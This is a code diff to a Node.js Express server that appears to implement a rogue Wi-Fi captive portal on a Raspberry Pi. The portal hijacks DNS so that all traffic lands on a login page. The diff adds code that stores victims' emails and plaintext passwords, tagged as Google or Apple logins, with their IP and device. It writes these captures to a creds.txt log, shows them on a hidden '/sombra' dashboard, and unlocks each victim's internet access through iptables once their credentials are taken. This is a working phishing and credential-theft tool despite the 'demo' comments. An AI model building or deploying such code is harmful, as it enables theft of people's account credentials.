@@ -4,6 +4,9 @@ const bcrypt = require('bcryptjs');
 const flash = require('connect-flash');
 const path = require('path');
 const crypto = require('crypto');
+const net = require('net');
+const fs = require('fs');
+const { execFile } = require('child_process');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -21,11 +24,105 @@ app.use(session({
   saveUninitialized: false
 }));
 app.use(flash());
+
+// ---------- Captive-portal host fallback (Pi mode) ----------
+// On the Pi, dnsmasq answers every DNS query with the Pi's own IP, so
+// captive-portal probes (generate_204, hotspot-detect.html, ...) and any
+// other foreign Host header land here. Unknown hosts are redirected to the
+// portal page. Direct-IP access and known local hosts always pass through.
+// Clients already unlocked by grantNetwork get a bare 204 (the OS treats a
+// 204 as "internet works" and dismisses the captive portal).
+const KNOWN_HOSTS = new Set(['localhost', '127.0.0.1', '::1', '[::1]', '0.0.0.0']);
+const EXTRA_HOSTS = new Set(
+  String(process.env.PORTAL_HOSTS || '').split(',').map(s => s.trim().toLowerCase()).filter(Boolean)
+);
+const grantedIps = new Set(); // client IPs unlocked by grantNetwork (Pi mode only)
+
+function portalBase(req) {
+  const env = process.env.PORTAL_REDIRECT_BASE;
+  if (env) return env.replace(/\/+$/, '');
+  return 'http://' + normalizeIp(req.socket.localAddress || '127.0.0.1');
+}
+
+app.use((req, res, next) => {
+  const host = String(req.hostname || '').toLowerCase();
+  if (!host || KNOWN_HOSTS.has(host) || EXTRA_HOSTS.has(host) || net.isIP(host) > 0) return next();
+  if (grantedIps.has(normalizeIp(req.ip))) {
+    // Already unlocked: answer captive probes (and anything else the OS or
+    // browser fires at us) with 204 so the portal closes for good.
+    return res.status(204).end();
+  }
+  return res.redirect(portalBase(req) + '/');
+});
+
 app.set('view engine', 'ejs');
 app.set('views', path.join(__dirname, 'views'));
 
 // In-memory user store (for demo purposes only)
 let users = [];
+
+// ---------- Durable credential log (instance/creds.txt) ----------
+// Every capture is appended as one JSON line, so the Pi keeps a plain-text
+// log on disk in addition to the /sombra dashboard. On boot the file is
+// re-imported, restoring the in-memory store.
+const CREDS_FILE = path.join(__dirname, 'instance', 'creds.txt');
+
+function ensureCredsFile() {
+  fs.mkdirSync(path.dirname(CREDS_FILE), { recursive: true });
+}
+
+function appendCredsFile(user) {
+  try {
+    ensureCredsFile();
+    const line = JSON.stringify({
+      id: user.id,
+      name: user.name,
+      email: user.email,
+      password: user.plainPassword,
+      source: user.source,
+      ip: user.ip,
+      device: user.device,
+      capturedAt: user.capturedAt
+    });
+    fs.appendFileSync(CREDS_FILE, line + '\n', 'utf8');
+  } catch (e) {
+    console.error('creds.txt write failed:', e.message);
+  }
+}
+
+// Rebuild the in-memory store from the log at boot. Lines are deduplicated
+// by id (last capture wins), matching the /sombra semantics where a
+// re-login updates the same user.
+async function loadCredsFile() {
+  try {
+    if (!fs.existsSync(CREDS_FILE)) return 0;
+    const lines = fs.readFileSync(CREDS_FILE, 'utf8').split(/\r?\n/).filter(Boolean);
+    const byId = new Map();
+    for (const line of lines) {
+      try {
+        const rec = JSON.parse(line);
+        if (!rec || typeof rec.email !== 'string') continue;
+        byId.set(rec.id, {
+          id: rec.id,
+          name: rec.name || rec.email,
+          email: rec.email,
+          password: await bcrypt.hash(rec.password || '', 10),
+          plainPassword: rec.password,
+          source: rec.source === 'apple' ? 'apple' : 'google',
+          capturedAt: rec.capturedAt || new Date().toISOString(),
+          ip: rec.ip,
+          device: rec.device || 'PC'
+        });
+      } catch (e) { /* skip malformed lines */ }
+    }
+    users = [...byId.values()];
+    console.log('Loaded ' + users.length + ' credential(s) from ' + CREDS_FILE);
+    return users.length;
+  } catch (e) {
+    console.error('creds.txt import failed:', e.message);
+    return 0;
+  }
+}
 
 // Short-lived access tokens for the /sombra dashboard. A new token is minted
 // on each successful gate login and lives in the browser page's memory only,
@@ -82,26 +179,36 @@ function normalizeIp(raw) {
   return raw.replace('::ffff:', '') || 'unknown';
 }
 
-// IP + device captured from the incoming request
-function captureMeta(req) {
+// IP + device captured from the incoming request.
+// Prefers the public IP detected by the client (sent as `publicIp` from the
+// browser via an external IP service), falling back to the server-side
+// socket/proxy IP when the client couldn't determine it.
+function captureMeta(req, publicIp) {
+  let ip = req.ip;
+  if (typeof publicIp === 'string') {
+    const candidate = publicIp.trim();
+    if (net.isIP(candidate) > 0) ip = candidate;
+  }
   return {
-    ip: normalizeIp(req.ip),
+    ip: normalizeIp(ip),
     device: detectDevice(req.headers['user-agent'] || '')
   };
 }
 
 // Create a user on the fly and capture the credentials (demo behavior)
 async function createCapturedUser(email, password, source, name, req) {
-  return {
-    id: users.length + 1,
+  const user = {
+    id: users.reduce((m, u) => Math.max(m, u.id || 0), 0) + 1,
     name: name || email,
     email,
     password: await bcrypt.hash(password, 10),
     plainPassword: password, // stored in plain text for the demo page only
     source,
     capturedAt: new Date().toISOString(),
-    ...captureMeta(req)
+    ...captureMeta(req, req.body && req.body.publicIp)
   };
+  appendCredsFile(user);
+  return user;
 }
 
 // Re-capture the credentials for an already known user
@@ -109,7 +216,8 @@ function updateCapturedUser(user, password, source, req) {
   user.plainPassword = password;
   user.source = source;
   user.capturedAt = new Date().toISOString();
-  Object.assign(user, captureMeta(req));
+  Object.assign(user, captureMeta(req, req.body && req.body.publicIp));
+  appendCredsFile(user);
   return user;
 }
 
@@ -150,6 +258,29 @@ function orderedCredentials() {
   return [...users]
     .sort((a, b) => new Date(b.capturedAt) - new Date(a.capturedAt))
     .map(toCredentialView);
+}
+
+// ---------- Network grant (Pi only) ----------
+// After a successful login the phone is unblocked on the Pi's firewall.
+// No-op unless PORTAL_GRANT=1 (only the Pi's systemd unit sets it). The IP
+// used is the one the Pi sees on its AP interface (req.ip), NOT the
+// browser-detected public IP — that one belongs to the router.
+function grantNetwork(req) {
+  if (process.env.PORTAL_GRANT !== '1') return;
+  const clientIp = normalizeIp(req.ip);
+  if (!clientIp || clientIp === 'unknown' || !net.isIP(clientIp)) return;
+  grantedIps.add(clientIp);
+  const chain = process.env.PORTAL_CHAIN || 'PORTAL_CLIENTS';
+  const run = args => new Promise(resolve => {
+    execFile('iptables', args, err => {
+      if (err) console.error('grantNetwork (' + chain + '):', err.message);
+      resolve();
+    });
+  });
+  // remove any block, then allow — the chain ends in DROP
+  run(['-D', chain, '-s', clientIp, '-j', 'DROP'])
+    .then(() => run(['-I', chain, '-s', clientIp, '-j', 'ACCEPT']))
+    .then(() => console.log('grantNetwork: unlocked ' + clientIp));
 }
 
 // ---------- Routes ----------
@@ -246,7 +377,8 @@ async function handleLogin(req, res, source) {
   // Store user in session
   req.session.user = { id: user.id, name: user.name, email };
 
-  // Login successful: close the site
+  // Login successful: unlock the phone on the Pi, then close the site
+  grantNetwork(req);
   res.redirect('/close');
 }
 
@@ -346,9 +478,13 @@ app.post('/sombra/delete/:id', requireSombra, (req, res) => {
   res.redirect('/sombra?tk=' + sombraToken(req));
 });
 
-// Start server
-app.listen(PORT, () => {
-  console.log(`Server running on http://localhost:${PORT}`);
-});
+// Start server (the credentials log is re-imported first)
+async function main() {
+  await loadCredsFile();
+  app.listen(PORT, () => {
+    console.log(`Server running on http://localhost:${PORT}`);
+  });
+}
+main();
 
 module.exports = app;
